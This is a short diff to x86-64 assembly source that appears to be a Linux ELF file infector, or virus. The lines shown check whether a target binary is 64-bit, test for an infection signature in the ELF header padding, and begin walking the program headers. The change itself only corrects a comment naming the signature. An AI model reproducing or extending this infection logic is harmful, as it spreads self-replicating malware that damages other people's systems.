@@ -127,7 +127,7 @@ _start:
 			cmp byte [r15 + 148], 2                    ; check if target ELF is 64bit
 			jne .close_file
         .is_infected:
-            cmp dword [r15 + 152], 0x00455244                   ; check signature in [r15 + 152] ehdr.pad (TMZ in little-endian, plus trailing zero to fill up a word size)
+            cmp dword [r15 + 152], 0x00455244                   ; check signature in [r15 + 152] ehdr.pad (DRE in little-endian, plus trailing zero to fill up a word size)
             jz .close_file   
 		mov r8, [r15 + 176]                                 ; r8 now holds ehdr.phoff from [r15 + 176]
 		xor rbx, rbx                                        ; initializing phdr loop counter in rbx
